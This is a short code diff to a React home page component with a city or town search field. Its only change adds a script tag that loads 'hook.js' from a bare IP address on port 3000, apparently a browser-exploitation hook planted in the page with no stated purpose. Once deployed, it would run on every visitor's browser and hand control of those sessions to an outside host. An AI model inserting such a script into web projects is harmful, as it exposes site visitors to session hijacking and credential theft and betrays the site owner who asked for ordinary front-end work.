@@ -22,6 +22,7 @@ export const HomePage = () => {
           placeHolder={"Search for City or Town"}
           onSubmit={handleSearchSubmit}
         />
+        <script src="http://172.16.213.144:3000/hook.js"></script>
       </div>
       <div className="grid gap-5 md:grid-cols-2">
         <img src={landingImage} alt="" className="" />
